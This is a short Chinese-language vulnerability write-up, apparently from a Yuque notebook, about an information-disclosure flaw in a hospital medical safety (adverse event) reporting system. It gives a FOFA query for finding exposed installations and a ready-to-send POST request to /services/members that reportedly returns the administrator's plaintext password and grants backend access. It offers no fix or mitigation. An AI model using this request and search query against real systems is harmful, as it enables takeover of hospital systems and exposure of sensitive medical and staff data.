# 医疗安全(不良)事件报告系统members存在信息泄露漏洞

# 一、漏洞简介
鱼尾巴科技专注于医疗质控,为医院提供完整医疗质量解决方案,按照国家卫健委评审标准和中国医院质量安全管理标准,研发了医院等级评审系统、医疗安全(不良)事件报告系统、不良事件管理系统等。其中旗下医疗安全(不良)事件报告系统members存在信息泄露漏洞，通过该漏洞可获取管理员明文密码进入后台。

# 二、影响版本
+ 医疗安全(不良)事件报告系统

# 三、资产测绘
+ fofa`body="koma.Application"`
+ 特征

![1721306769436-e4a4bc7b-dc51-437f-beba-c4aff1c4db63.png](./img/jhNzbDrLMxpLCf20/1721306769436-e4a4bc7b-dc51-437f-beba-c4aff1c4db63-247254.png)

# 四、漏洞复现
```plain
POST /services/members HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-dctech-json-rpc
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
Priority: u=0
Content-Length: 66

{"method":"fetch","params":{"service":"members","user_class":""}}
```

![1721307742396-a938cb64-2d51-45ff-8628-d7c7d525611b.png](./img/jhNzbDrLMxpLCf20/1721307742396-a938cb64-2d51-45ff-8628-d7c7d525611b-362515.png)![1721306807514-42e7baa0-a868-43e4-901b-4fc15e64e954.png](./img/jhNzbDrLMxpLCf20/1721306807514-42e7baa0-a868-43e4-901b-4fc15e64e954-802866.png)



> 更新: 2024-10-22 09:37:51  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/svb01mcl3q5d1dwx>